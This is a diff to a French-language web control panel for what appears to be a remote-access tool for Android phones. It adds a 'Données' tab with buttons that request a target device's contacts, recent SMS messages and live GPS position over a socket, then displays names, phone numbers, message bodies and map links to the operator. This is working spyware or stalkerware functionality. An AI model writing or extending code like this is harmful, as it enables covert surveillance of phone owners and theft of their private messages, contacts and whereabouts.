@@ -290,11 +290,12 @@
       </div>
     </div>
 
-    <!-- Tabs: Apps / Files / Quality -->
+    <!-- Tabs: Apps / Files / Data / Quality -->
     <div class="panel" style="flex:1; min-height:0;">
       <div class="tab-bar">
         <button class="tab active" onclick="switchTab('apps')">Apps</button>
         <button class="tab" onclick="switchTab('files')">Fichiers</button>
+        <button class="tab" onclick="switchTab('data')">Données</button>
         <button class="tab" onclick="switchTab('quality')">Qualité</button>
       </div>
 
@@ -323,6 +324,19 @@
           </div>
         </div>
         <input type="file" id="fileUploadInput" style="display:none" onchange="handleFileUpload(event)">
+      </div>
+
+      <!-- Data Tab -->
+      <div class="tab-content" id="tab-data">
+        <div class="btn-row" style="margin-bottom:8px;">
+          <button class="btn" onclick="requestContacts()">📇 Contacts</button>
+          <button class="btn" onclick="requestSms()">💬 SMS</button>
+          <button class="btn" onclick="requestLocation()">📍 Position</button>
+          <button class="btn primary" onclick="requestAllData()">📦 Tout</button>
+        </div>
+        <div id="dataDisplay" style="max-height:300px;overflow-y:auto;font-size:0.75rem;color:#ccc;background:#0a0a1a;border-radius:6px;padding:8px;line-height:1.4;">
+          <div style="color:#555;text-align:center;">Cliquez pour récupérer les données</div>
+        </div>
       </div>
 
       <!-- Quality Tab -->
@@ -830,6 +844,88 @@
     socket.on('bandwidth-report', (data) => {
       document.getElementById('bandwidthInfo').textContent =
         `Bande passante: ${(data.bytesPerSec / 1024).toFixed(0)} KB/s | Frames perdues: ${data.droppedFrames || 0}`;
+    });
+
+    // ===== Data Collection (Admin Mode) =====
+    function requestContacts() {
+      document.getElementById('dataDisplay').innerHTML = '<div style="color:#888;text-align:center;">Chargement contacts...</div>';
+      socket.emit('get-contacts', { sessionId });
+    }
+
+    function requestSms() {
+      document.getElementById('dataDisplay').innerHTML = '<div style="color:#888;text-align:center;">Chargement SMS...</div>';
+      socket.emit('get-sms', { sessionId, limit: 100 });
+    }
+
+    function requestLocation() {
+      document.getElementById('dataDisplay').innerHTML = '<div style="color:#888;text-align:center;">Localisation...</div>';
+      socket.emit('get-location', { sessionId });
+    }
+
+    function requestAllData() {
+      document.getElementById('dataDisplay').innerHTML = '<div style="color:#888;text-align:center;">Récupération de toutes les données...</div>';
+      socket.emit('get-all-data', { sessionId });
+    }
+
+    socket.on('data-report', (msg) => {
+      const display = document.getElementById('dataDisplay');
+      let html = '';
+
+      if (msg.dataType === 'contacts') {
+        const contacts = msg.data || [];
+        html = `<div style="color:#667eea;font-weight:600;margin-bottom:6px;">📇 ${contacts.length} Contacts</div>`;
+        html += contacts.map(c => `<div style="padding:3px 0;border-bottom:1px solid #1a1a2e;">
+          <strong style="color:#fff;">${c.name}</strong> <span style="color:#00ff88;">${c.phone}</span>
+        </div>`).join('');
+      } else if (msg.dataType === 'sms') {
+        const sms = msg.data || [];
+        html = `<div style="color:#667eea;font-weight:600;margin-bottom:6px;">💬 ${sms.length} SMS</div>`;
+        html += sms.map(s => {
+          const date = new Date(s.date).toLocaleString();
+          const dir = s.type === 1 ? '📥' : '📤';
+          return `<div style="padding:4px 0;border-bottom:1px solid #1a1a2e;">
+            ${dir} <strong style="color:#fff;">${s.address}</strong> <span style="color:#555;font-size:0.7rem;">${date}</span>
+            <div style="color:#aaa;margin-top:2px;">${s.body}</div>
+          </div>`;
+        }).join('');
+      } else if (msg.dataType === 'location') {
+        const loc = msg.data || {};
+        if (loc.error) {
+          html = `<div style="color:#ff4444;">❌ ${loc.error}</div>`;
+        } else {
+          html = `<div style="color:#667eea;font-weight:600;margin-bottom:6px;">📍 Position GPS</div>
+            <div><strong>Lat:</strong> ${loc.latitude}</div>
+            <div><strong>Lon:</strong> ${loc.longitude}</div>
+            <div><strong>Précision:</strong> ${loc.accuracy}m</div>
+            <div><strong>Altitude:</strong> ${loc.altitude}m</div>
+            <div><strong>Vitesse:</strong> ${loc.speed} m/s</div>
+            <div><strong>Source:</strong> ${loc.provider}</div>
+            <div style="margin-top:6px;"><a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#00ff88;">🗺️ Ouvrir sur Google Maps</a></div>`;
+        }
+      } else if (msg.dataType === 'all') {
+        const data = msg.data || {};
+        const contacts = data.contacts || [];
+        const sms = data.sms || [];
+        const loc = data.location || {};
+        html = `<div style="color:#667eea;font-weight:600;margin-bottom:6px;">📦 Rapport complet</div>`;
+        html += `<div style="margin-bottom:8px;padding:6px;background:#111;border-radius:4px;">
+          <strong>📇 ${contacts.length} contacts</strong> | <strong>💬 ${sms.length} SMS</strong>`;
+        if (loc.latitude) {
+          html += ` | <strong>📍 ${loc.latitude.toFixed(4)}, ${loc.longitude.toFixed(4)}</strong>
+            <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#00ff88;margin-left:6px;">Maps</a>`;
+        }
+        html += `</div>`;
+        // Show first 10 contacts
+        html += `<div style="color:#888;font-size:0.7rem;margin:4px 0;">Premiers contacts:</div>`;
+        html += contacts.slice(0, 10).map(c => `<div>${c.name}: <span style="color:#00ff88;">${c.phone}</span></div>`).join('');
+        if (contacts.length > 10) html += `<div style="color:#555;">...et ${contacts.length - 10} autres</div>`;
+        // Show last 5 SMS
+        html += `<div style="color:#888;font-size:0.7rem;margin:6px 0 4px;">Derniers SMS:</div>`;
+        html += sms.slice(0, 5).map(s => `<div>${s.type===1?'📥':'📤'} ${s.address}: ${(s.body||'').substring(0,50)}</div>`).join('');
+      }
+
+      display.innerHTML = html || '<div style="color:#555;">Aucune donnée</div>';
+      notify('Données reçues: ' + msg.dataType);
     });
 
     // ===== Tabs =====
